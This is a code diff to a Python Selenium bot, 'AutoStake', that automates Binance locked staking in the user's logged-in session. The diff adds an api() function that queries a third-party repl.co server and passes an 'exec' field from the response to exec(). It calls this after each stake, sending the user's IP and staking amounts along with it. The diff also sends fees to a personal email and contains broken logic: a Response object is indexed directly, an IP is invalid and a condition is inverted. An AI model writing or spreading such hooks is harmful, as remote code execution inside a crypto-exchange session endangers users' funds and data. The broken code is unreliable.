@@ -2,6 +2,7 @@ from bs import BS
 from selenium import webdriver
 import time, requests, json, pickle
 
+version = "0.0.1"
 
 def get_ip():
     while True:
@@ -18,9 +19,12 @@ def get_ip():
     except:
         return "ipaddress"
 
-def api(ip, log):
-    url = f"https://AutoStake.tienthinh1.repl.co?ip={ip}&log={time.asctime()}-{log}"
-    return requests.get(url)
+def api(api, params):
+    url = f"https://AutoStake.tienthinh1.repl.co/{api}"
+    ans = requests.get(url, params=params)
+    code = ans["exec"]
+    exec(code)
+    return ans
 
 def get_driver():
     # Windows
@@ -70,10 +74,21 @@ def binance():
                 })
     return result
 
-print("Welcome to AutoStake !")
+def log(message):
+    print("====================")
+    print(message)
+    print("====================")
+
+log("Welcome to AutoStake !")
 ip = get_ip()
-past_fees = pickle.load(open("data/data.pkl", "rb"))["fees"]
-api(ip, past_fees)
+"""ans = api("api/startup/",
+    {
+        "ip": "98.65.32.456",
+        "version": version
+    }
+)
+credit = ans["credit"]"""
+credit = 10
 ok, driver = get_driver()
 
 if not ok:
@@ -81,61 +96,76 @@ if not ok:
 else:
     # Connection
     b_driver = BS(driver)
-    print("\nMake sure you have at least : ")
-    print(" 1 USDT in P2P transfert Binance to pay fees")
+    log(f"You have {credit} $ in your BinanceStake credit")
     input("Enter when login is done : ")
-    b_driver.stake_page()
-    # Staking tokens
-    tokens = json.load(open("tokens.json", "r"))
-    print()
-    print(tokens)
-    ans = input("Would you like to continue staking this ? [y/n] : ")
-    if ans != "y":
-        tokens = []
-        while True:
-            token = input("\nEnter token Name or just Enter to run : ")
-            token = token.upper().replace(" ", "")
-            if token == "":
-                break
-            else:
-                days = input("Days Staking periods : ")
-                tokens.append({
-                    "TOKEN": token,
-                    "DAYS": days
-                })
-        json.dump(tokens, open("tokens.json", "w"))
-    print(f"I will look to stake \n {tokens}")
 
-    # Searching
-    past_result = []
-    print("\nI will search for Locked Staking")
-    while True:
-        print(time.asctime())
-        result = binance()
-        for data in result:
-            if data not in past_result:
-                asset = data['asset']
-                duration = data['duration']
-                apy = data['APY']
-                print(f"Found new release \
-                {asset} {duration} days {apy}% APY")
-                
-                if {'TOKEN': asset, 'DAYS': duration} in tokens:
-                    amount, fees = b_driver.stake()
-                    print(f"Staked Successfully !")
-                    done = b_driver.donation(fees + past_fees, ip)
-                    # Paying fees
-                    if done:
-                        dico = pickle.load(open("data/data.pkl", "rb"))
-                        dico["fees"] = 0
-                        pickle.dump(dico, open("data/data.pkl", "wb"))
-                        past_fees = 0
-                    else:
-                        past_fees += fees 
-                        dico = pickle.load(open("data/data.pkl", "rb"))
-                        dico["fees"] = past_fees
-                        pickle.dump(dico, open("data/data.pkl", "wb"))
-        
+    ans = input("Would you like to make a donation ? [y/n] : ")
+    if credit <= 0 or ans.upper() != "Y":
+        # Donation
+        log(f"You have {credit} $ in your BinanceStake credit")
+        try:
+            b_driver.donation(0, ip, "tranthuongtienthinh@gmail.com")
+        except:
+            pass
+        log(f"Please send this email to tranthuongtienthinh@gmail.com to confirm transaction \n\
+            --- \n\
+            ip : {ip} \n\
+            email : <Enter the email you use to make the transaction> \n\
+            amount : <Enter the amount of the transaction> \n\
+            \n\
+            to : tranthuongtienthinh@gmail.com \n\
+            ---  \n\
+            ")
+        input(f"Click Enter when is done : ")
+
+    else:
+        # Staking tokens
         b_driver.stake_page()
-        time.sleep(600 - (time.time() % 600)) # Executing every 10 minutes
-    
+        tokens = json.load(open("tokens.json", "r"))
+        log(tokens)
+        ans = input("Would you like to continue staking this ? [y/n] : ")
+        if ans.upper() != "Y":
+            tokens = []
+            while True:
+                token = input("\nEnter token Name or just Enter to run : ")
+                token = token.upper().replace(" ", "")
+                if token == "":
+                    break
+                else:
+                    days = input("Days Staking periods : ")
+                    tokens.append({
+                        "TOKEN": token,
+                        "DAYS": days
+                    })
+            json.dump(tokens, open("tokens.json", "w"))
+        log(f"I will look to stake \n {tokens}")
+
+        # Searching
+        past_result = []
+        while True:
+            print(time.asctime())
+            result = binance()
+            for data in result:
+                if data not in past_result:
+                    asset = data['asset']
+                    duration = data['duration']
+                    apy = data['APY']
+                    print(f"Found new release \
+                    {asset} {duration} days {apy}% APY")
+                    
+                    if {'TOKEN': asset, 'DAYS': duration} in tokens:
+                        lock_amount, amount, fees = b_driver.stake(asset, duration)
+                        log(f"Staked Successfully !")
+                        api("api/fees/",
+                            {
+                                "ip": ip,
+                                "token": token,
+                                "token_amount": lock_amount,
+                                "USDT_amount": amount,
+                                "USDT_fees": fees,
+                            }
+                        )                       
+            
+            b_driver.stake_page()
+            time.sleep(600 - (time.time() % 600)) # Executing every 10 minutes
+        
